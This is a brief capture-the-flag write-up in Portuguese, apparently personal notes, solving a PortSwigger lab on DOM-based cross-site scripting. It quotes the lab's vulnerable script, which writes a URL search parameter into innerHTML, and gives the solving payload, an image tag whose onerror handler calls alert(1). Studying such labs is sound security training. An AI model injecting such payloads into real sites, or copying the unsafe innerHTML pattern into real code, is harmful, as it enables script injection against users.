#ctf 

https://portswigger.net/web-security/cross-site-scripting/dom-based/lab-innerhtml-sink

A página tem um script que é executado ao fazer uma busca

```javascript
function doSearchQuery(query) {
    document.getElementById('searchMessage').innerHTML = query;
}

var query = (new URLSearchParams(window.location.search)).get('search');
if(query) {
	doSearchQuery(query);
}
```

E insere a query em:

```html
<span id="searchMessage">
query
</span>
```

Então é so inserir este payload:

```html
<img src='x' onerror='alert(1)'>
```

GG